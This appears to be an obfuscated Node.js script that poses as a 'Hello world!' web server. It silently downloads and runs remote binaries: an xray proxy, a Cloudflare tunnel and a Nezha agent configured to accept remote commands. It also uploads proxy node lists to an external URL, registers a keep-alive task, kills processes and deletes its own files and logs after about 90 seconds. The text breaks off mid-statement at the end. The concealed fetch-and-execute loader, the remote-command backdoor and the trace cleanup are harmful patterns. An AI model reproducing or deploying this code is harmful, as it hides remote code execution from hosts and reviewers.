const _0x57e576=_0x5771;(function(_0xb75cb4,_0x3d0992){const _0x3fe208=_0x5771,_0x56fd6d=_0xb75cb4();while(!![]){try{const _0x434092=-parseInt(_0x3fe208(0x16c))/0x1+parseInt(_0x3fe208(0x1cd))/0x2+-parseInt(_0x3fe208(0x1b0))/0x3+-parseInt(_0x3fe208(0x168))/0x4+-parseInt(_0x3fe208(0x1e0))/0x5*(-parseInt(_0x3fe208(0x1b3))/0x6)+-parseInt(_0x3fe208(0x1ae))/0x7+parseInt(_0x3fe208(0x158))/0x8*(parseInt(_0x3fe208(0x176))/0x9);if(_0x434092===_0x3d0992)break;else _0x56fd6d['push'](_0x56fd6d['shift']());}catch(_0x42396f){_0x56fd6d['push'](_0x56fd6d['shift']());}}}(_0x2816,0x19cfb));const express=require(_0x57e576(0x15c)),app=express(),axios=require(_0x57e576(0x18c)),os=require('os'),fs=require('fs'),path=require(_0x57e576(0x185)),{promisify}=require(_0x57e576(0x16a)),exec=promisify(require(_0x57e576(0x18f))['exec']),{execSync}=require('child_process'),UPLOAD_URL=process[_0x57e576(0x1df)][_0x57e576(0x19c)]||'',PROJECT_URL=process[_0x57e576(0x1df)][_0x57e576(0x166)]||'',AUTO_ACCESS=process[_0x57e576(0x1df)][_0x57e576(0x144)]||![],FILE_PATH=process[_0x57e576(0x1df)][_0x57e576(0x13c)]||_0x57e576(0x18e),SUB_PATH=process[_0x57e576(0x1df)][_0x57e576(0x131)]||_0x57e576(0x1b8),PORT=process[_0x57e576(0x1df)][_0x57e576(0x19f)]||process[_0x57e576(0x1df)][_0x57e576(0x161)]||0xbb8,UUID=process['env'][_0x57e576(0x141)]||'d1429a97-aeab-49b0-8465-d2f26881ebf3',NEZHA_SERVER=process['env'][_0x57e576(0x1da)]||'',NEZHA_PORT=process[_0x57e576(0x1df)]['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0x57e576(0x1a7)]||'',ARGO_DOMAIN=process[_0x57e576(0x1df)][_0x57e576(0x13e)]||'',ARGO_AUTH=process[_0x57e576(0x1df)]['ARGO_AUTH']||'',ARGO_PORT=process[_0x57e576(0x1df)][_0x57e576(0x17c)]||0x1f41,CFIP=process[_0x57e576(0x1df)][_0x57e576(0x19b)]||_0x57e576(0x165),CFPORT=process[_0x57e576(0x1df)][_0x57e576(0x1b1)]||0x1bb,NAME=process[_0x57e576(0x1df)][_0x57e576(0x18d)]||'';!fs[_0x57e576(0x187)](FILE_PATH)?(fs[_0x57e576(0x1ce)](FILE_PATH),console[_0x57e576(0x1ac)](FILE_PATH+_0x57e576(0x1e1))):console['log'](FILE_PATH+_0x57e576(0x195));function generateRandomName(){const _0x62c5bb=_0x57e576,_0xe0411e=_0x62c5bb(0x1a4);let _0x3b2b39='';for(let _0x2cd0ed=0x0;_0x2cd0ed<0x6;_0x2cd0ed++){_0x3b2b39+=_0xe0411e[_0x62c5bb(0x184)](Math['floor'](Math[_0x62c5bb(0x1a0)]()*_0xe0411e[_0x62c5bb(0x19e)]));}return _0x3b2b39;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x57e576(0x1d7)](FILE_PATH,npmName),phpPath=path[_0x57e576(0x1d7)](FILE_PATH,phpName),webPath=path[_0x57e576(0x1d7)](FILE_PATH,webName),botPath=path[_0x57e576(0x1d7)](FILE_PATH,botName),subPath=path[_0x57e576(0x1d7)](FILE_PATH,_0x57e576(0x1d0)),listPath=path[_0x57e576(0x1d7)](FILE_PATH,_0x57e576(0x182)),bootLogPath=path[_0x57e576(0x1d7)](FILE_PATH,_0x57e576(0x126)),configPath=path[_0x57e576(0x1d7)](FILE_PATH,_0x57e576(0x136));function deleteNodes(){const _0x4b8b05=_0x57e576;try{if(!UPLOAD_URL)return;if(!fs[_0x4b8b05(0x187)](subPath))return;let _0x482a38;try{_0x482a38=fs[_0x4b8b05(0x16b)](subPath,_0x4b8b05(0x13b));}catch{return null;}const _0x334b14=Buffer[_0x4b8b05(0x151)](_0x482a38,_0x4b8b05(0x1a6))['toString']('utf-8'),_0x36fa3f=_0x334b14[_0x4b8b05(0x1b2)]('\x0a')[_0x4b8b05(0x147)](_0x59646a=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4b8b05(0x1aa)](_0x59646a));if(_0x36fa3f[_0x4b8b05(0x19e)]===0x0)return;return axios[_0x4b8b05(0x1c9)](UPLOAD_URL+_0x4b8b05(0x171),JSON[_0x4b8b05(0x149)]({'nodes':_0x36fa3f}),{'headers':{'Content-Type':_0x4b8b05(0x156)}})['catch'](_0x2c7e4b=>{return null;}),null;}catch(_0x35055d){return null;}}function cleanupOldFiles(){const _0x3643cc=_0x57e576;try{const _0x262eb3=fs[_0x3643cc(0x14f)](FILE_PATH);_0x262eb3[_0x3643cc(0x183)](_0x52bba2=>{const _0x6aadd5=_0x3643cc,_0x5b35dc=path[_0x6aadd5(0x1d7)](FILE_PATH,_0x52bba2);try{const _0x31b31a=fs['statSync'](_0x5b35dc);_0x31b31a[_0x6aadd5(0x1c6)]()&&fs[_0x6aadd5(0x1ca)](_0x5b35dc);}catch(_0x57416e){}});}catch(_0x1f01a2){}}function _0x2816(){const _0x143b9d=['readFileSync','123626eMBskp','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','http\x20server\x20is\x20running\x20on\x20port:','\x0a\x20\x20\x20\x20','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','/api/delete-nodes','message','toString','Unknown','https://oooo.serv00.net/add-url','430173rjSwum','blackhole','http','unshift','\x0a\x20\x20credentials-file:\x20','data','ARGO_PORT','npm\x20running\x20error:\x20','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','arm','tunnel.yml','.exe\x20>\x20nul\x202>&1','list.txt','forEach','charAt','path','del\x20/f\x20/q\x20','existsSync','platform','\x20-c\x20\x22','\x20-c\x20','then','axios','NAME','./tmp','child_process','all','/sub.txt\x20saved\x20successfully','has','basename','close','\x20already\x20exists','https://arm64.ssss.nyc.mn/agent','push','block','taskkill\x20/f\x20/im\x20','Empowerment\x20failed\x20for\x20','CFIP','UPLOAD_URL','freedom','length','SERVER_PORT','random','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','vless','success','abcdefghijklmnopqrstuvwxyz','tcp','base64','NEZHA_KEY','2083','tls','test','https://ipapi.co/json/','log','--tls','719824YzcwQN','Error\x20in\x20startserver:','520998FFkbMz','CFPORT','split','66OoQMtx','Error\x20downloading\x20files:','firefox','Subscription\x20uploaded\x20successfully','/vless-argo','4839','&fp=firefox&type=ws&host=','\x20successfully','Download\x20','Unhandled\x20error\x20in\x20startserver:','&path=%2Fvless-argo%3Fed%3D2560#','https://amd64.ssss.nyc.mn/v1','php\x20running\x20error:\x20','Skipping\x20adding\x20automatic\x20access\x20task','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','pop','arch','isFile','countryCode','https://amd64.ssss.nyc.mn/web','post','unlinkSync','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','finish','75756DdBHPQ','mkdirSync','/trojan-argo','sub.txt','vmess','stream','127.0.0.1','&path=%2Ftrojan-argo%3Fed%3D2560#','quic','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','join','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','response','NEZHA_SERVER','?security=tls&sni=','rm\x20-rf\x20','\x0a\x20\x20tunnel:\x20','pipe','env','48745MLrMnA','\x20is\x20created','Hello\x20world!','\x0a\x0atrojan://','substring','2053','web\x20running\x20error:\x20','2096','Error\x20reading\x20boot.log:','/vmess-argo?ed=2560','get','status','/vmess-argo','boot.log','org','https://arm64.ssss.nyc.mn/bot','https://amd64.ssss.nyc.mn/bot','includes','TunnelSecret','\x0a\x0avmess://','Error\x20executing\x20command:\x20','http://ip-api.com/json/','\x0aclient_secret:\x20','\x20is\x20running','SUB_PATH','true','chmod','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','pkill\x20-f\x20\x22[','config.json','Add\x20automatic\x20access\x20task\x20faild:\x20','catch','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','send','utf-8','FILE_PATH','?encryption=none&security=tls&sni=','ARGO_DOMAIN','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','\x22\x20>\x20/dev/null\x202>&1','UUID','tunnel.json','error','AUTO_ACCESS','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','\x20>/dev/null\x202>&1\x20&','filter','ARGO_DOMAIN:','stringify','createWriteStream','match','config.yaml','https://arm64.ssss.nyc.mn/web','none','readdirSync','https+local://8.8.8.8/dns-query','from','clear','/api/add-nodes','443','\x20-s\x20','application/json','ArgoDomain:','88rZPmrb','text/plain;\x20charset=utf-8','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','2087','express','writeFileSync','nohup\x20','App\x20is\x20running','\x20>/dev/null\x202>&1','PORT','automatic\x20access\x20task\x20added\x20successfully','country_code','\x0avless://','cdns.doon.eu.org','PROJECT_URL','/dev/null','660148yNWDRE','aarch64','util'];_0x2816=function(){return _0x143b9d;};return _0x2816();}app[_0x57e576(0x123)]('/',function(_0x32b22c,_0xad509a){const _0x5685ba=_0x57e576;_0xad509a['send'](_0x5685ba(0x11b));});async function generateConfig(){const _0x2df7b7=_0x57e576,_0x540af0={'log':{'access':_0x2df7b7(0x167),'error':_0x2df7b7(0x167),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x2df7b7(0x1a2),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x2df7b7(0x1b7),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x2df7b7(0x1cf),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x2df7b7(0x1d3),'protocol':_0x2df7b7(0x1a2),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x2df7b7(0x1a5),'security':_0x2df7b7(0x14e)}},{'port':0xbba,'listen':_0x2df7b7(0x1d3),'protocol':_0x2df7b7(0x1a2),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x2df7b7(0x14e)},'streamSettings':{'network':'ws','security':_0x2df7b7(0x14e),'wsSettings':{'path':_0x2df7b7(0x1b7)}},'sniffing':{'enabled':!![],'destOverride':[_0x2df7b7(0x178),_0x2df7b7(0x1a9),_0x2df7b7(0x1d5)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x2df7b7(0x1d3),'protocol':_0x2df7b7(0x1d1),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x2df7b7(0x125)}},'sniffing':{'enabled':!![],'destOverride':[_0x2df7b7(0x178),_0x2df7b7(0x1a9),_0x2df7b7(0x1d5)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x2df7b7(0x14e),'wsSettings':{'path':_0x2df7b7(0x1cf)}},'sniffing':{'enabled':!![],'destOverride':[_0x2df7b7(0x178),_0x2df7b7(0x1a9),_0x2df7b7(0x1d5)],'metadataOnly':![]}}],'dns':{'servers':[_0x2df7b7(0x150)]},'outbounds':[{'protocol':_0x2df7b7(0x19d),'tag':'direct'},{'protocol':_0x2df7b7(0x177),'tag':_0x2df7b7(0x198)}]};fs[_0x2df7b7(0x15d)](path[_0x2df7b7(0x1d7)](FILE_PATH,_0x2df7b7(0x136)),JSON['stringify'](_0x540af0,null,0x2));}function getSystemArchitecture(){const _0x31290a=_0x57e576,_0x342e2f=os[_0x31290a(0x1c5)]();return _0x342e2f===_0x31290a(0x17f)||_0x342e2f==='arm64'||_0x342e2f===_0x31290a(0x169)?_0x31290a(0x17f):'amd';}function downloadFile(_0x4996e9,_0x3a978d,_0x5166b){const _0x89bae6=_0x57e576,_0x234d87=_0x4996e9;!fs[_0x89bae6(0x187)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x3fe274=fs[_0x89bae6(0x14a)](_0x234d87);axios({'method':'get','url':_0x3a978d,'responseType':_0x89bae6(0x1d2)})[_0x89bae6(0x18b)](_0x8ccd2c=>{const _0x2a25ae=_0x89bae6;_0x8ccd2c[_0x2a25ae(0x17b)][_0x2a25ae(0x1de)](_0x3fe274),_0x3fe274['on'](_0x2a25ae(0x1cc),()=>{const _0x3f3a07=_0x2a25ae;_0x3fe274[_0x3f3a07(0x194)](),console[_0x3f3a07(0x1ac)](_0x3f3a07(0x1bb)+path['basename'](_0x234d87)+_0x3f3a07(0x1ba)),_0x5166b(null,_0x234d87);}),_0x3fe274['on'](_0x2a25ae(0x143),_0x11308d=>{const _0xa67a31=_0x2a25ae;fs['unlink'](_0x234d87,()=>{});const _0x51fa8b=_0xa67a31(0x1bb)+path[_0xa67a31(0x193)](_0x234d87)+'\x20failed:\x20'+_0x11308d[_0xa67a31(0x172)];console[_0xa67a31(0x143)](_0x51fa8b),_0x5166b(_0x51fa8b);});})[_0x89bae6(0x138)](_0x164129=>{const _0x308d0c=_0x89bae6,_0x2bcaa5=_0x308d0c(0x1bb)+path[_0x308d0c(0x193)](_0x234d87)+'\x20failed:\x20'+_0x164129[_0x308d0c(0x172)];console[_0x308d0c(0x143)](_0x2bcaa5),_0x5166b(_0x2bcaa5);});}async function downloadFilesAndRun(){const _0xbcf628=_0x57e576,_0x89e306=getSystemArchitecture(),_0x497223=getFilesForArchitecture(_0x89e306);if(_0x497223[_0xbcf628(0x19e)]===0x0){console['log'](_0xbcf628(0x13f));return;}const _0x48f0a0=_0x497223['map'](_0x1c0e4a=>{return new Promise((_0x437dfe,_0x1725be)=>{downloadFile(_0x1c0e4a['fileName'],_0x1c0e4a['fileUrl'],(_0x1a140c,_0x2b0b1a)=>{_0x1a140c?_0x1725be(_0x1a140c):_0x437dfe(_0x2b0b1a);});});});try{await Promise[_0xbcf628(0x190)](_0x48f0a0);}catch(_0x1e10a5){console['error'](_0xbcf628(0x1b4),_0x1e10a5);return;}function _0x44c9a7(_0x4d8f9d){const _0x58f9df=_0xbcf628,_0x47ff98=0x1fd;_0x4d8f9d[_0x58f9df(0x183)](_0x131e08=>{const _0x203c12=_0x58f9df;fs[_0x203c12(0x187)](_0x131e08)&&fs[_0x203c12(0x133)](_0x131e08,_0x47ff98,_0x4716a0=>{const _0x19061d=_0x203c12;_0x4716a0?console[_0x19061d(0x143)](_0x19061d(0x19a)+_0x131e08+':\x20'+_0x4716a0):console[_0x19061d(0x1ac)]('Empowerment\x20success\x20for\x20'+_0x131e08+':\x20'+_0x47ff98[_0x19061d(0x173)](0x8));});});}const _0x5347b5=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x44c9a7(_0x5347b5);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x15e866=NEZHA_SERVER[_0xbcf628(0x12a)](':')?NEZHA_SERVER[_0xbcf628(0x1b2)](':')[_0xbcf628(0x1c4)]():'',_0x58579e=new Set([_0xbcf628(0x154),'8443',_0xbcf628(0x120),'2087',_0xbcf628(0x1a8),_0xbcf628(0x11e)]),_0xaa9a1f=_0x58579e[_0xbcf628(0x192)](_0x15e866)?_0xbcf628(0x132):'false',_0xafa676=_0xbcf628(0x12f)+NEZHA_KEY+_0xbcf628(0x1c2)+NEZHA_SERVER+_0xbcf628(0x1a1)+_0xaa9a1f+_0xbcf628(0x15a)+UUID;fs['writeFileSync'](path[_0xbcf628(0x1d7)](FILE_PATH,_0xbcf628(0x14c)),_0xafa676);const _0x3fb6dd='nohup\x20'+phpPath+_0xbcf628(0x189)+FILE_PATH+_0xbcf628(0x17e);try{await exec(_0x3fb6dd),console[_0xbcf628(0x1ac)](phpName+_0xbcf628(0x130)),await new Promise(_0x29acd7=>setTimeout(_0x29acd7,0x3e8));}catch(_0x4e73c3){console['error'](_0xbcf628(0x1bf)+_0x4e73c3);}}else{let _0x3d3007='';const _0x240b3b=[_0xbcf628(0x154),'8443',_0xbcf628(0x120),_0xbcf628(0x15b),'2083',_0xbcf628(0x11e)];_0x240b3b['includes'](NEZHA_PORT)&&(_0x3d3007=_0xbcf628(0x1ad));const _0xbb3f17=_0xbcf628(0x15e)+npmPath+_0xbcf628(0x155)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x3d3007+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0xbb3f17),console[_0xbcf628(0x1ac)](npmName+'\x20is\x20running'),await new Promise(_0x1027e8=>setTimeout(_0x1027e8,0x3e8));}catch(_0x50b614){console[_0xbcf628(0x143)](_0xbcf628(0x17d)+_0x50b614);}}}else console[_0xbcf628(0x1ac)](_0xbcf628(0x1c3));const _0x5e1e1c=_0xbcf628(0x15e)+webPath+_0xbcf628(0x18a)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x5e1e1c),console[_0xbcf628(0x1ac)](webName+'\x20is\x20running'),await new Promise(_0x2d3ce9=>setTimeout(_0x2d3ce9,0x3e8));}catch(_0x1ec21a){console[_0xbcf628(0x143)](_0xbcf628(0x11f)+_0x1ec21a);}if(fs[_0xbcf628(0x187)](botPath)){let _0x296923;if(ARGO_AUTH[_0xbcf628(0x14b)](/^[A-Z0-9a-z=]{120,250}$/))_0x296923=_0xbcf628(0x1cb)+ARGO_AUTH;else ARGO_AUTH[_0xbcf628(0x14b)](/TunnelSecret/)?_0x296923=_0xbcf628(0x1d8)+FILE_PATH+'/tunnel.yml\x20run':_0x296923=_0xbcf628(0x139)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0xbcf628(0x15e)+botPath+'\x20'+_0x296923+'\x20>/dev/null\x202>&1\x20&'),console[_0xbcf628(0x1ac)](botName+_0xbcf628(0x130)),await new Promise(_0x34ea88=>setTimeout(_0x34ea88,0x7d0));}catch(_0x5832fb){console['error']('Error\x20executing\x20command:\x20'+_0x5832fb);}}await new Promise(_0x14d5c5=>setTimeout(_0x14d5c5,0x1388));}function getFilesForArchitecture(_0x252a49){const _0x81e16f=_0x57e576;let _0x127e6b;_0x252a49===_0x81e16f(0x17f)?_0x127e6b=[{'fileName':webPath,'fileUrl':_0x81e16f(0x14d)},{'fileName':botPath,'fileUrl':_0x81e16f(0x128)}]:_0x127e6b=[{'fileName':webPath,'fileUrl':_0x81e16f(0x1c8)},{'fileName':botPath,'fileUrl':_0x81e16f(0x129)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x586a82=_0x252a49===_0x81e16f(0x17f)?_0x81e16f(0x196):'https://amd64.ssss.nyc.mn/agent';_0x127e6b[_0x81e16f(0x179)]({'fileName':npmPath,'fileUrl':_0x586a82});}else{const _0x4ba2ae=_0x252a49==='arm'?'https://arm64.ssss.nyc.mn/v1':_0x81e16f(0x1be);_0x127e6b['unshift']({'fileName':phpPath,'fileUrl':_0x4ba2ae});}}return _0x127e6b;}function _0x5771(_0x22fc68,_0x1b639b){_0x22fc68=_0x22fc68-0x11b;const _0x28169c=_0x2816();let _0x5771bd=_0x28169c[_0x22fc68];return _0x5771bd;}function argoType(){const _0x5189d8=_0x57e576;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x5189d8(0x1ac)](_0x5189d8(0x1c1));return;}if(ARGO_AUTH[_0x5189d8(0x12a)](_0x5189d8(0x12b))){fs[_0x5189d8(0x15d)](path['join'](FILE_PATH,_0x5189d8(0x142)),ARGO_AUTH);const _0x4af0b5=_0x5189d8(0x1dd)+ARGO_AUTH[_0x5189d8(0x1b2)]('\x22')[0xb]+_0x5189d8(0x17a)+path[_0x5189d8(0x1d7)](FILE_PATH,_0x5189d8(0x142))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x5189d8(0x134)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x5189d8(0x15d)](path[_0x5189d8(0x1d7)](FILE_PATH,_0x5189d8(0x180)),_0x4af0b5);}else console['log'](_0x5189d8(0x145));}async function extractDomains(){const _0xd363e3=_0x57e576;let _0x2c98f3;if(ARGO_AUTH&&ARGO_DOMAIN)_0x2c98f3=ARGO_DOMAIN,console[_0xd363e3(0x1ac)](_0xd363e3(0x148),_0x2c98f3),await _0x51d6b5(_0x2c98f3);else try{const _0x71b787=fs['readFileSync'](path[_0xd363e3(0x1d7)](FILE_PATH,_0xd363e3(0x126)),_0xd363e3(0x13b)),_0x3d59e2=_0x71b787[_0xd363e3(0x1b2)]('\x0a'),_0x2a8729=[];_0x3d59e2['forEach'](_0x115872=>{const _0x481de5=_0xd363e3,_0x50a66e=_0x115872[_0x481de5(0x14b)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x50a66e){const _0x459e77=_0x50a66e[0x1];_0x2a8729[_0x481de5(0x197)](_0x459e77);}});if(_0x2a8729['length']>0x0)_0x2c98f3=_0x2a8729[0x0],console[_0xd363e3(0x1ac)](_0xd363e3(0x157),_0x2c98f3),await _0x51d6b5(_0x2c98f3);else{console['log'](_0xd363e3(0x170)),fs[_0xd363e3(0x1ca)](path['join'](FILE_PATH,'boot.log'));async function _0xaf44dd(){const _0x4c0acb=_0xd363e3;try{process['platform']==='win32'?await exec(_0x4c0acb(0x199)+botName+_0x4c0acb(0x181)):await exec(_0x4c0acb(0x135)+botName['charAt'](0x0)+']'+botName[_0x4c0acb(0x11d)](0x1)+_0x4c0acb(0x140));}catch(_0x1dfa58){}}_0xaf44dd(),await new Promise(_0x140eed=>setTimeout(_0x140eed,0xbb8));const _0x5b6c76=_0xd363e3(0x139)+FILE_PATH+_0xd363e3(0x16d)+ARGO_PORT;try{await exec(_0xd363e3(0x15e)+botPath+'\x20'+_0x5b6c76+_0xd363e3(0x146)),console['log'](botName+_0xd363e3(0x130)),await new Promise(_0x884dd4=>setTimeout(_0x884dd4,0xbb8)),await extractDomains();}catch(_0x4e682f){console['error'](_0xd363e3(0x12d)+_0x4e682f);}}}catch(_0x1009bf){console[_0xd363e3(0x143)](_0xd363e3(0x121),_0x1009bf);}async function _0x14f8b1(){const _0x2a4a9b=_0xd363e3;try{const _0x5c3918=await axios[_0x2a4a9b(0x123)](_0x2a4a9b(0x1ab),{'timeout':0xbb8});if(_0x5c3918[_0x2a4a9b(0x17b)]&&_0x5c3918['data'][_0x2a4a9b(0x163)]&&_0x5c3918[_0x2a4a9b(0x17b)][_0x2a4a9b(0x127)])return _0x5c3918[_0x2a4a9b(0x17b)]['country_code']+'_'+_0x5c3918[_0x2a4a9b(0x17b)][_0x2a4a9b(0x127)];}catch(_0x2e22f9){try{const _0x439423=await axios[_0x2a4a9b(0x123)](_0x2a4a9b(0x12e),{'timeout':0xbb8});if(_0x439423[_0x2a4a9b(0x17b)]&&_0x439423['data'][_0x2a4a9b(0x124)]===_0x2a4a9b(0x1a3)&&_0x439423[_0x2a4a9b(0x17b)]['countryCode']&&_0x439423['data'][_0x2a4a9b(0x127)])return _0x439423[_0x2a4a9b(0x17b)][_0x2a4a9b(0x1c7)]+'_'+_0x439423[_0x2a4a9b(0x17b)][_0x2a4a9b(0x127)];}catch(_0x47c52e){}}return _0x2a4a9b(0x174);}async function _0x51d6b5(_0x221a6f){const _0x31f84c=await _0x14f8b1(),_0x4ca1c5=NAME?NAME+'-'+_0x31f84c:_0x31f84c;return new Promise(_0x10a607=>{setTimeout(()=>{const _0x94f090=_0x5771,_0x21da97={'v':'2','ps':''+_0x4ca1c5,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':'none','host':_0x221a6f,'path':_0x94f090(0x122),'tls':_0x94f090(0x1a9),'sni':_0x221a6f,'alpn':'','fp':_0x94f090(0x1b5)},_0x2382eb=_0x94f090(0x164)+UUID+'@'+CFIP+':'+CFPORT+_0x94f090(0x13d)+_0x221a6f+_0x94f090(0x1b9)+_0x221a6f+_0x94f090(0x1bd)+_0x4ca1c5+_0x94f090(0x12c)+Buffer['from'](JSON[_0x94f090(0x149)](_0x21da97))[_0x94f090(0x173)]('base64')+_0x94f090(0x11c)+UUID+'@'+CFIP+':'+CFPORT+_0x94f090(0x1db)+_0x221a6f+_0x94f090(0x1b9)+_0x221a6f+_0x94f090(0x1d4)+_0x4ca1c5+_0x94f090(0x16f);console[_0x94f090(0x1ac)](Buffer[_0x94f090(0x151)](_0x2382eb)['toString'](_0x94f090(0x1a6))),fs['writeFileSync'](subPath,Buffer[_0x94f090(0x151)](_0x2382eb)[_0x94f090(0x173)](_0x94f090(0x1a6))),console[_0x94f090(0x1ac)](FILE_PATH+_0x94f090(0x191)),uploadNodes(),app[_0x94f090(0x123)]('/'+SUB_PATH,(_0x2969c1,_0x13a6df)=>{const _0x47f5c8=_0x94f090,_0x2a3ea5=Buffer[_0x47f5c8(0x151)](_0x2382eb)[_0x47f5c8(0x173)](_0x47f5c8(0x1a6));_0x13a6df['set']('Content-Type',_0x47f5c8(0x159)),_0x13a6df[_0x47f5c8(0x13a)](_0x2a3ea5);}),_0x10a607(_0x2382eb);},0x7d0);});}}async function uploadNodes(){const _0x7bf3e2=_0x57e576;if(UPLOAD_URL&&PROJECT_URL){const _0x551f17=PROJECT_URL+'/'+SUB_PATH,_0x497f69={'subscription':[_0x551f17]};try{const _0xfd6249=await axios[_0x7bf3e2(0x1c9)](UPLOAD_URL+'/api/add-subscriptions',_0x497f69,{'headers':{'Content-Type':_0x7bf3e2(0x156)}});return _0xfd6249&&_0xfd6249[_0x7bf3e2(0x124)]===0xc8?(console[_0x7bf3e2(0x1ac)](_0x7bf3e2(0x1b6)),_0xfd6249):null;}catch(_0x2fb8c0){if(_0x2fb8c0[_0x7bf3e2(0x1d9)]){if(_0x2fb8c0[_0x7bf3e2(0x1d9)][_0x7bf3e2(0x124)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x7bf3e2(0x187)](listPath))return;const _0xe4f12e=fs[_0x7bf3e2(0x16b)](listPath,_0x7bf3e2(0x13b)),_0x376974=_0xe4f12e[_0x7bf3e2(0x1b2)]('\x0a')[_0x7bf3e2(0x147)](_0x394621=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x7bf3e2(0x1aa)](_0x394621));if(_0x376974['length']===0x0)return;const _0x4e8b85=JSON[_0x7bf3e2(0x149)]({'nodes':_0x376974});try{const _0x347562=await axios[_0x7bf3e2(0x1c9)](UPLOAD_URL+_0x7bf3e2(0x153),_0x4e8b85,{'headers':{'Content-Type':_0x7bf3e2(0x156)}});return _0x347562&&_0x347562[_0x7bf3e2(0x124)]===0xc8?(console[_0x7bf3e2(0x1ac)]('Nodes\x20uploaded\x20successfully'),_0x347562):null;}catch(_0x5c5a61){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x5ccab0=_0x5771,_0x137b34=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x137b34[_0x5ccab0(0x197)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x137b34['push'](phpPath);process[_0x5ccab0(0x188)]==='win32'?exec(_0x5ccab0(0x186)+_0x137b34['join']('\x20')+'\x20>\x20nul\x202>&1',_0x258ca9=>{const _0xefa108=_0x5ccab0;console[_0xefa108(0x152)](),console['log'](_0xefa108(0x15f)),console[_0xefa108(0x1ac)](_0xefa108(0x1d6));}):exec(_0x5ccab0(0x1dc)+_0x137b34['join']('\x20')+_0x5ccab0(0x160),_0x440133=>{const _0x2db873=_0x5ccab0;console[_0x2db873(0x152)](),console[_0x2db873(0x1ac)]('App\x20is\x20running'),console['log'](_0x2db873(0x1d6));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x171bb8=_0x57e576;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x171bb8(0x1c0));return;}try{const _0x4095bb=await axios[_0x171bb8(0x1c9)](_0x171bb8(0x175),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x171bb8(0x1ac)](_0x171bb8(0x162)),_0x4095bb;}catch(_0x590844){return console[_0x171bb8(0x143)](_0x171bb8(0x137)+_0x590844[_0x171bb8(0x172)]),null;}}async function startserver(){const _0x54ce38=_0x57e576;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x2dee59){console['error'](_0x54ce38(0x1af),_0x2dee59);}}startserver()['catch'](_0x4e1892=>{const 